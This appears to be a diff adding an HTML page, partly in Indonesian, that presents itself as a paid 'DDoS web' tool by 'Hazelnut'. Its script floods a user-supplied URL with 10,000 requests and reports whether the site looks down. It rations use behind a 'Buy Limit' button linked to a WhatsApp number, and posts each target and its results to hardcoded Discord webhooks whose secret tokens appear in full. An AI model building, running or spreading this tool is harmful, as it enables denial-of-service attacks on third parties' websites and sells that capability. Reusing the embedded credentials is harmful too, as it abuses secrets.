@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>http://Ddos-web-by-Hazelnut.com</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #1e1e1e; color: white; padding: 20px; }
+        h2 { margin-bottom: 10px; }
+        input, button { padding: 10px; margin: 10px; border: none; border-radius: 5px; }
+        input { width: 250px; text-align: center; }
+        button { background-color: #007bff; color: white; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #0056b3; }
+        #status { margin-top: 10px; font-size: 18px; font-weight: bold; }
+        #result { margin-top: 20px; padding: 15px; border-radius: 5px; background-color: #2a2a2a; display: none; text-align: left; }
+    </style>
+</head>
+<body>
+    <h2>Ddos web by Hazelnut</h2>
+    <input type="text" id="urlInput" placeholder="Masukkan URL">
+    <br>
+    <span>Server:</span>
+    <span id="status">🚨 Waiting for request</span>
+    <br><br>
+    <button id="sendBtn" onclick="sendRequests()">Kirim</button>
+    <div id="result"></div>
+
+    <script>
+        let requestCount = localStorage.getItem("requestCount") || 0;
+        let lastRequestDate = localStorage.getItem("lastRequestDate") || "";
+        let buyLimitCount = localStorage.getItem("buyLimitCount") || 0;
+        let today = new Date().toISOString().split("T")[0];
+
+        if (lastRequestDate !== today) {
+            localStorage.setItem("requestCount", 0);
+            localStorage.setItem("lastRequestDate", today);
+            requestCount = 0;
+        }
+
+        function updateButton() {
+            let sendBtn = document.getElementById("sendBtn");
+            if (requestCount >= 5) {
+                sendBtn.innerHTML = "💰 Buy Limit";
+                sendBtn.setAttribute("onclick", "buyLimit()");
+                document.getElementById("status").innerHTML = "💰 Your request is finished";
+            } else {
+                sendBtn.innerHTML = "Kirim";
+                sendBtn.setAttribute("onclick", "sendRequests()");
+            }
+        }
+
+        async function buyLimit() {
+            buyLimitCount++;
+            localStorage.setItem("buyLimitCount", buyLimitCount);
+
+            let phone = "6285183131924";
+            let webhookWA = "https://discord.com/api/webhooks/1349395595634413588/_JW6JgGevMoz86csKyxBeurtFKDoBsucOU5igrCNJTjuZQ2P2eAUWjl6DuC52Q1CJH4r";
+            let payloadWA = JSON.stringify({ content: `Someone has buy limit ${buyLimitCount}` });
+
+            await fetch(webhookWA, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: payloadWA
+            });
+
+            window.location.href = `https://wa.me/${phone}?text=Halo+kak+Hazel,+saya+mau+beli+limit`;
+
+            setTimeout(() => {
+                localStorage.setItem("requestCount", 0);
+                requestCount = 0;
+                document.getElementById("status").innerHTML = "🚨 Waiting for request";
+                updateButton();
+                alert("Limit successfully reset!");
+            }, 5000);
+        }
+
+        async function sendRequests() {
+            if (requestCount >= 5) {
+                updateButton();
+                return;
+            }
+
+            let urlInput = document.getElementById("urlInput");
+            let url = urlInput.value.trim();
+            let statusEl = document.getElementById("status");
+            let resultEl = document.getElementById("result");
+
+            if (!url.match(/^https?:\/\//)) {
+                alert("Masukkan URL yang valid!");
+                return;
+            }
+
+            statusEl.innerHTML = "⌛ Sending requests...";
+            resultEl.style.display = "none";
+
+            let success = 0, failed = 0;
+            const totalRequests = 10000;
+            for (let i = 0; i < totalRequests; i++) {
+                try {
+                    let response = await fetch(url);
+                    if (response.ok) {
+                        success++;
+                    } else {
+                        failed++;
+                    }
+                } catch (error) {
+                    failed++;
+                }
+            }
+
+            let down = failed >= success ? "⚠️ Possible down" : "✅ Still up";
+            resultEl.innerHTML = `<strong>🔍 Request Summary 🔍</strong><br><br>` +
+                                 `🌍 <strong>URL:</strong> ${url}<br>` +
+                                 `✅ <strong>Success:</strong> ${success}<br>` +
+                                 `❌ <strong>Failed:</strong> ${failed}<br>` +
+                                 `📉 <strong>Status:</strong> ${down}<br>`;
+            resultEl.style.display = "block";
+            statusEl.innerHTML = "✅ Requests sent!";
+
+            let webhookResult = "https://discord.com/api/webhooks/1349624372070973520/Q8i-e-ZyYFpjAn-xCnYjCAqt_wvJ_Sgu6LB5oFN-U2rq920D4ipQBxPuHA2ID2la4DhW";
+            let payloadResult = JSON.stringify({
+                content: `🔍 **Request Summary**\n🌍 **URL:** ${url}\n✅ **Success:** ${success}\n❌ **Failed:** ${failed}\n📉 **Status:** ${down}`
+            });
+
+            await fetch(webhookResult, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: payloadResult
+            });
+
+            requestCount++;
+            localStorage.setItem("requestCount", requestCount);
+            updateButton();
+        }
+
+        updateButton();
+    </script>
+</body>
+</html>
